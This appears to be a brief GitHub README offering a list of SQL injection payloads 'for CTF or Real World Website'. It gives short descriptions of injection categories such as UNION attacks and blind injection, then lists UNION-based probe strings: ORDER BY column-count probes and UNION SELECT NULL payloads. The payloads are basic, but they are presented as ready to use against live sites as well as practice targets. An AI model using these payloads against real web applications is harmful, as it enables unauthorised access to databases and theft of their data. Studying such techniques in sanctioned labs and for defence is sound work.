# SQL-Payload-

List of ALl SQL PAyload to be used for CTF or Real World Website !

![image](https://user-images.githubusercontent.com/82144868/210714729-ed83ccfa-6f56-4dce-ae99-d2c3ae8657b0.png)

SQL injection examples
There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:

Retrieving hidden data, where you can modify an SQL query to return additional results.
Subverting application logic, where you can change a query to interfere with the application's logic.
UNION attacks, where you can retrieve data from different database tables.
Examining the database, where you can extract information about the version and structure of the database.
Blind SQL injection, where the results of a query you control are not returned in the application's responses.


UNION ATTACK 

*' ORDER BY 1--
*' ORDER BY 2--
*' ORDER BY 3--
etc.

*' UNION SELECT NULL--
*' UNION SELECT NULL,NULL--
*' UNION SELECT NULL,NULL,NULL--
etc


